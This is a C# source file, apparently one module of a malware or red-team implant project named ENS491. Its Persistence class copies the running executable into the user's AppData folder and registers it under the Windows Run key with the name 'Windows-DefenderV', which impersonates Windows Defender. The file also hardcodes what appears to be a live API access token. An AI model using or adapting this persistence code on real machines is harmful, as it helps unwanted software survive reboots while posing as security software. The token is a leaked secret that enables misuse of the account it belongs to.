using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ENS491
{

    class Persistence:Module
    {

        
        static string userName = Environment.UserName;
        static string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        static string token = "zRMBGjognOUAAAAAAAAAAULObwxJVrKoIbaYIh9wvoypz5G4Am3mwIn36JBB3ga-";
        public virtual void Start()
        {
            //Thread.Sleep(30 * 1000);


            #region Add to startup
            // Run at Startup
            var exe = Assembly.GetExecutingAssembly().Location;
            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
            if (!File.Exists(destiny))
            {
                Console.WriteLine(pathStartUp);
                var data = File.ReadAllBytes(exe);
                File.WriteAllBytes(destiny, data);
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("Windows-DefenderV", destiny);
                Console.WriteLine("Log: Added to startup");
            }
            #endregion

            #region Task Scheduler - Daily trigger to run every 10 minutes for a duration of 18 hours
            
            #endregion
        }
    }
}